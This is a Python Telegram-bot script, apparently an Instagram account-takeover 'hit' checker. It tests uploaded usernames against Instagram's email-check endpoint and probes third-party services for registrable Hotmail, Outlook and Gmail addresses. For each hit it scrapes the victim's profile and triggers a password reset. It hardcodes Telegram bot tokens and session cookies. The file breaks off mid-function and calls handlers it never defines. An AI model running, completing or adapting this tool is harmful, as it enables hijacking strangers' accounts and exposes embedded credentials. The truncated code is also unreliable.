import requests 
import telebot 
from telebot import types
import requests
from uuid import uuid4
import random
import os
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import datetime
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
zzk=0

lst=["6646283401:AAHvrbAdRo9ul_l62t0oDDMPC-Hy7nQwseg","6853881087:AAGpWwAJbDt4lk3k7yE05Gd5zkYcZqXoFVw","5811443329:AAFiKMNRxDaiEo0uicV6UG3A1aWYnA8WKq4","7098654303:AAFXNWk9m7YxN6cDkJcpjHS_ONY7qHd2hFA","6361972349:AAHHXQRpmyf9EyCzdCOqCcSkciKCS5xE3As","7177384219:AAGypWjhJzJ9H_1ZtrLZP8nzVf80brdVcVU","7131711807:AAHVRysC7A7vbmiPQRghobd_578yqwjpiNU","7198231388:AAF8JrQ_wfRj18POfz9883ih5LB1E3horR0"] 
tok=input("Enter Token Bot : ")
if tok in lst:
	os.system('clear')
else:
	print("Msg : انت غير مشتـرك ياعـزيزي")
	exit()
bot = telebot.TeleBot(tok)
os.system('clear')					
print('روح للبوت دز start/')
print("\n")
print('ثم ارجع للاداه')
import datetime
zxu = datetime.datetime.now()
#bot = telebot.TeleBot(tok)
@bot.message_handler(commands=['start'])
def start(message):
 global zzk
 zzk+=1
 nm = message.from_user.first_name
 id2 = message.from_user.id
 userk = message.from_user.username
 zxu = datetime.datetime.now()
 tt=f'''
عضو يستخدم البوت…
ـــــــــــــــــــــــــــــــــــــــ
اسم المستخدم : {nm}
يوزر المستخدم : @{userk}
ايدي المستخدم : {id2}
رقم المستخدم  : {zzk}
الوقت : {zxu}
ـــــــــــــــــــــــــــــــــــــــ
ـ @P_W_7'''

 key = types.InlineKeyboardMarkup()
 bot.send_message(message.chat.id, f"<strong>{tt}</strong>",parse_mode="html",reply_markup=key) 
 ch = types.InlineKeyboardButton(text ="فحـص لسـت هوتـميل", callback_data = 'list')
 cn = types.InlineKeyboardButton(text ="فحـص لسـت اوتلوك", callback_data = 'listot')
 gm = types.InlineKeyboardButton(text ="فحـص لسـت جـيميل", callback_data = 'listgm')
 cz = types.InlineKeyboardButton(text ="عشوائي قديم هوتميل", callback_data = 'hotrandom')
 czz = types.InlineKeyboardButton(text ="عشوائي قديم اوتلوك", callback_data = 'uotrandom')
 kk = types.InlineKeyboardButton(text =" حـذف الـسته القـديمه ", callback_data = 'ttl')
 az = types.InlineKeyboardButton(text ="المبرمج : @P_W_7", url = 'https://t.me/P_W_7')
 fr = message.from_user.first_name
 maac = types.InlineKeyboardMarkup()
 maac.row_width=2
 maac.add(cn,ch,gm,cz,czz,kk,az)
 bot.send_message(message.chat.id,f"<strong>اهلا بك : | {fr} | في بـوت فـحص  لـسته  انسـتكرام للحصول على معلوماتك [ /info ]</strong>",parse_mode="html",reply_markup=maac)
@bot.callback_query_handler(func=lambda call:True)
def st(call):
 
 
 if call.data== 'list':
            nc1 = types.InlineKeyboardMarkup(row_width=2)
            message= bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل لسـته انستكرام لـيتم الفحص ',reply_markup=nc1)
            bot.register_next_step_handler(message,k1,message.id)

 elif call.data== 'listot':
            nc1 = types.InlineKeyboardMarkup(row_width=2)
            message= bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل لسـته انستكرام لـيتم الفحص ',reply_markup=nc1)
            bot.register_next_step_handler(message,k11,message.id)

 elif call.data== 'listgm':
            nc1 = types.InlineKeyboardMarkup(row_width=2)
            message= bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل لسـته انستكرام لـيتم الفحص ',reply_markup=nc1)
            bot.register_next_step_handler(message,k12,message.id)

 elif call.data== 'hotrandom':
  nc1 = types.InlineKeyboardMarkup(row_width=2)
  MC = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='ارسـل كـلمه ابدا',reply_markup=nc1)
  bot.register_next_step_handler(MC,k13)  
 elif call.data== 'uotrandom':
  nc1 = types.InlineKeyboardMarkup(row_width=2)
  MC = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='ارسـل كـلمه ابدا',reply_markup=nc1)
  bot.register_next_step_handler(MC,k14)                                          
 elif call.data== 'ttl':
  nc1 = types.InlineKeyboardMarkup(row_width=2)
  MC = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل كـلمه حـذف ',reply_markup=nc1)
  bot.register_next_step_handler(MC,k2)
y1=0
y2=0
n1=0
zy1=0
xy=0
def k1(message,id):
	global y1,y2,xy,zy1,n1
	iid = str(message.from_user.id)
	aol1=0
	face1=0
	face2=0
	aol2=0
	eerr=0
	zzoy=0
	addad=0
	try:
		filename = message.document.file_name
		file_info = bot.get_file(message.document.file_id)
		use = bot.download_file(file_info.file_path)		
		with open(f'usernamezaid{iid}.txt', 'wb') as (zaidno):
			zaidno.write(use)
	except:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خـطأ فـي الـملف</strong>",parse_mode="html",reply_markup=key)
	try:
		file = open(f'usernamezaid{iid}.txt','r').read().splitlines()
		addd = len(open(f"usernamezaid{iid}.txt").read().splitlines())
	except FileNotFoundError as error:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خطـأ او مشـكله مـا </strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>تـم لقـد بـدأ الفحـص رجـع لبـايثون</strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>الـنوع /انسـتكرام/لسـته/هـوتميل</strong>",parse_mode="html",reply_markup=key)
	os.system('clear')
	for zood in file:
			addad+=1
			zzoy+=1
			try:
				email = (zood).split('@')[0]+'@hotmail.com'
			except:
				email = (zood)+dom
				eerr+=1				
			url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
			head= {	
		 'Host': 'www.instagram.com',
		 'origin': 'https://www.instagram.com',
		 'referer': 'https://www.instagram.com/accounts/signup/email/',	
		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
		 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',};data = {
	'email':f'{email}'
	}
			try:
				r= requests.post(url,headers=head,data=data).text
			except:
				continue
			if 'email_is_taken' in r:	
				y1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
				try:
					rr = requests.post(f'https://hotmail5-916bc4f56aa2.herokuapp.com/zaid/?email={email}').text
				except:
					continue 
				if 'good' in rr:
				  zy1+=1
				  os.system('cls'if os.name=='net'else'clear')
				  print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
				  user=email.split('@')[0]
				  try:
					  urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
					  he = {
	'accept': '*/*',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar',
	'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
	'origin': 'https://www.instagram.com',
	'referer': 'https://www.instagram.com/',
	'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
	'x-asbd-id': '198387',
	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	'x-ig-app-id': '936619743392459',
	'x-ig-www-claim': '0',
	}
	
					  re =requests.get(urlg, headers=he).json()
					  io = re['data']['user']['biography']
					  fol = re['data']['user']['edge_followed_by']['count']
					  fos = re['data']['user']['edge_follow']['count']
					  ido = re['data']['user']['id']
					  nam = re['data']['user']['full_name']
					  isp = re['data']['user']['is_private']
					  op = re['data']['user']['edge_owner_to_timeline_media']['count']
					  try:
					  	ree = requests.get(f'https://o7aa.pythonanywhere.com/?id={ido}').json()
					  	date = ree["date"]
					  except:
					  	date="No Date"
					  url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
					  he = {
	'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
	'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
	'Cookie2': '$Version=1',
	'Accept-Language': 'ar-EG, en-US',
	'X-IG-Connection-Type': 'MOBILE(LTE)',
	'X-IG-Capabilities': 'AQ==',
	'Accept-Encoding': 'gzip',
	}
					  data = {
	"user_id":ido,"device_id":str(uuid4()),
	}
					  try:
					  	zaid = requests.post(url,headers=he, data=data).json()
					  	rest = zaid["obfuscated_email"]
					  except:
					  	rest='No Rest'
					  ff =f'''
🎖═══════════════════
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
🎖═══════════════════
🤴 𝐁𝐘 ﴾ @P_W_7 ﴿'''
					  key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
				  except:
				  	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{email}</strong>",parse_mode="html",reply_markup=key)					
				else:
					os.system('cls'if os.name=='net'else'clear')
					xy+=1
					print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			else:
				n1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')

			try:
				if addd == addad:
					key = types.InlineKeyboardMarkup()
					bot.send_message(message.chat.id, f"<strong>لـقد انـتهى فـحص الـسته</strong>",parse_mode="html",reply_markup=key)
					print('لقـد انتهاء فحص السته')
			except:
				pass

def k11(message,id):
	global y1,y2,xy,zy1,n1
	iid = str(message.from_user.id)
	aol1=0
	face1=0
	face2=0
	aol2=0
	eerr=0
	zzoy=0
	addad=0
	try:
		filename = message.document.file_name
		file_info = bot.get_file(message.document.file_id)
		use = bot.download_file(file_info.file_path)		
		with open(f'usernamezaid{iid}.txt', 'wb') as (zaidno):
			zaidno.write(use)
	except:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خـطأ فـي الـملف</strong>",parse_mode="html",reply_markup=key)
	try:
		file = open(f'usernamezaid{iid}.txt','r').read().splitlines()
		addd = len(open(f"usernamezaid{iid}.txt").read().splitlines())
	except FileNotFoundError as error:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خطـأ او مشـكله مـا </strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>تـم لقـد بـدأ الفحـص رجـع لبـايثون</strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>الـنوع /انسـتكرام/لسـته/اوتـلوك</strong>",parse_mode="html",reply_markup=key)
	os.system('clear')
	for zood in file:
			addad+=1
			zzoy+=1
			try:
				email = (zood).split('@')[0]+'@outlook.com'
			except:
				email = (zood)+'@outlook.com'
				eerr+=1				
			url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
			head= {	
		 'Host': 'www.instagram.com',
		 'origin': 'https://www.instagram.com',
		 'referer': 'https://www.instagram.com/accounts/signup/email/',	
		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
		 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',};data = {
	'email':f'{email}'
	}
			try:
				r= requests.post(url,headers=head,data=data).text
			except:
				continue
			if 'email_is_taken' in r:	
				y1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
				try:
					rr = requests.post(f'https://hotmail5-916bc4f56aa2.herokuapp.com/zaid/?email={email}').text
				except:
					continue 
				if 'good' in rr:
				  zy1+=1
				  os.system('cls'if os.name=='net'else'clear')
				  print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
				  user=email.split('@')[0]
				  try:
					  urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
					  he = {
	'accept': '*/*',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar',
	'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
	'origin': 'https://www.instagram.com',
	'referer': 'https://www.instagram.com/',
	'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
	'x-asbd-id': '198387',
	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	'x-ig-app-id': '936619743392459',
	'x-ig-www-claim': '0',
	}
	
					  re =requests.get(urlg, headers=he).json()
					  io = re['data']['user']['biography']
					  fol = re['data']['user']['edge_followed_by']['count']
					  fos = re['data']['user']['edge_follow']['count']
					  ido = re['data']['user']['id']
					  nam = re['data']['user']['full_name']
					  isp = re['data']['user']['is_private']
					  op = re['data']['user']['edge_owner_to_timeline_media']['count']
					  try:
					  	ree = requests.get(f'https://o7aa.pythonanywhere.com/?id={ido}').json()
					  	date = ree["date"]
					  except:
					  	date="No Date"
					  url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
					  he = {
	'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
	'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
	'Cookie2': '$Version=1',
	'Accept-Language': 'ar-EG, en-US',
	'X-IG-Connection-Type': 'MOBILE(LTE)',
	'X-IG-Capabilities': 'AQ==',
	'Accept-Encoding': 'gzip',
	}
					  data = {
	"user_id":ido,"device_id":str(uuid4()),
	}
					  try:
					  	zaid = requests.post(url,headers=he, data=data).json()
					  	rest = zaid["obfuscated_email"]
					  except:
					  	rest='No Rest'
					  ff =f'''
🎖═══════════════════
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
🎖═══════════════════
🤴 𝐁𝐘 ﴾ @P_W_7 ﴿'''
					  key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
				  except:
				  	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{email}</strong>",parse_mode="html",reply_markup=key)					
				else:
					os.system('cls'if os.name=='net'else'clear')
					xy+=1
					print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			else:
				n1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')

			try:
				if addd == addad:
					key = types.InlineKeyboardMarkup()
					bot.send_message(message.chat.id, f"<strong>لـقد انـتهى فـحص الـسته</strong>",parse_mode="html",reply_markup=key)
					print('لقـد انتهاء فحص السته')
			except:
				pass				
def k12(message,id):
	global y1,y2,xy,zy1,n1
	iid = str(message.from_user.id)
	aol1=0
	face1=0
	face2=0
	aol2=0
	eerr=0
	zzoy=0
	addad=0
	try:
		filename = message.document.file_name
		file_info = bot.get_file(message.document.file_id)
		use = bot.download_file(file_info.file_path)		
		with open(f'usernamezaid{iid}.txt', 'wb') as (zaidno):
			zaidno.write(use)
	except:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خـطأ فـي الـملف</strong>",parse_mode="html",reply_markup=key)
	try:
		file = open(f'usernamezaid{iid}.txt','r').read().splitlines()
		addd = len(open(f"usernamezaid{iid}.txt").read().splitlines())
	except FileNotFoundError as error:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خطـأ او مشـكله مـا </strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>تـم لقـد بـدأ الفحـص رجـع لبـايثون</strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>الـنوع /انسـتكرام/لسـته/جـيميل</strong>",parse_mode="html",reply_markup=key)
	os.system('clear')
	for zood in file:
			addad+=1
			zzoy+=1
			try:
				email = (zood).split('@')[0]+'@gmail.com'
			except:
				email = (zood)+'@gmail.com'
				eerr+=1				
			url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
			head= {	
		 'Host': 'www.instagram.com',
		 'origin': 'https://www.instagram.com',
		 'referer': 'https://www.instagram.com/accounts/signup/email/',	
		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
		 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',};data = {
	'email':f'{email}'
	}
			try:
				r= requests.post(url,headers=head,data=data).text
			except:
				continue
			if 'email_is_taken' in r:	
				y1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
				try:
					rr=requests.get(f"https://api-slfo-3242f30c4c76.herokuapp.com/api/gmail/BBMZZ/v1/G-1/{email.split('@')[0]}").text
				except:
					continue 
				if 'Ok' in rr:
				  zy1+=1
				  os.system('cls'if os.name=='net'else'clear')
				  print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
				  user=email.split('@')[0]
				  try:
					  urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
					  he = {
	'accept': '*/*',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar',
	'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
	'origin': 'https://www.instagram.com',
	'referer': 'https://www.instagram.com/',
	'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
	'x-asbd-id': '198387',
	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	'x-ig-app-id': '936619743392459',
	'x-ig-www-claim': '0',
	}
	
					  re =requests.get(urlg, headers=he).json()
					  io = re['data']['user']['biography']
					  fol = re['data']['user']['edge_followed_by']['count']
					  fos = re['data']['user']['edge_follow']['count']
					  ido = re['data']['user']['id']
					  nam = re['data']['user']['full_name']
					  isp = re['data']['user']['is_private']
					  op = re['data']['user']['edge_owner_to_timeline_media']['count']
					  try:
					  	ree = requests.get(f'https://o7aa.pythonanywhere.com/?id={ido}').json()
					  	date = ree["date"]
					  except:
					  	date="No Date"
					  url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
					  he = {
	'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
	'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
	'Cookie2': '$Version=1',
	'Accept-Language': 'ar-EG, en-US',
	'X-IG-Connection-Type': 'MOBILE(LTE)',
	'X-IG-Capabilities': 'AQ==',
	'Accept-Encoding': 'gzip',
	}
					  data = {
	"user_id":ido,"device_id":str(uuid4()),
	}
					  try:
					  	zaid = requests.post(url,headers=he, data=data).json()
					  	rest = zaid["obfuscated_email"]
					  except:
					  	rest='No Rest'
					  ff =f'''
🎖═══════════════════
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
🎖═══════════════════
🤴 𝐁𝐘 ﴾ @P_W_7 ﴿'''
					  key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
				  except:
				  	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{email}</strong>",parse_mode="html",reply_markup=key)					
				else:
